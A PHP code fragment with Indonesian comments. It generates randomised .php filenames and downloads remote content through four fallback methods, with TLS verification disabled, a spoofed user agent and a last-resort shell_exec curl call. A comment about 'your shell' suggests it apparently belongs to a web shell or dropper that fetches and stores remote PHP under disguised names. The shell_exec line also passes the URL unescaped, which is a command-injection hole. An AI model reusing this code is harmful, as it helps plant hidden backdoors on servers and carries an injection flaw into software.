// Fungsi untuk generate random filename dengan format yang diinginkan
function generateRandomFilename() {
    $hex = bin2hex(random_bytes(8)); // 16 karakter hex
    $rand = mt_rand(10000000, 99999999) . '.' . mt_rand(10000000, 99999999);
    return $hex . '.' . $rand . '.php';
}

// Fungsi untuk download dengan multiple method (seperti di shell Anda)
function downloadContent($url) {
    $content = false;
    
    // Method 1: cURL
    if (function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        $content = curl_exec($ch);
        curl_close($ch);
    }
    
    // Method 2: file_get_contents
    if ($content === false || strlen($content) < 10) {
        $content = @file_get_contents($url);
    }
    
    // Method 3: fopen
    if ($content === false || strlen($content) < 10) {
        $handle = @fopen($url, 'r');
        if ($handle) {
            $content = stream_get_contents($handle);
            fclose($handle);
        }
    }
    
    // Method 4: shell_exec curl
    if ($content === false || strlen($content) < 10) {
        $content = @shell_exec("curl -s -k -L {$url} 2>/dev/null");
    }
    
    return $content;
}

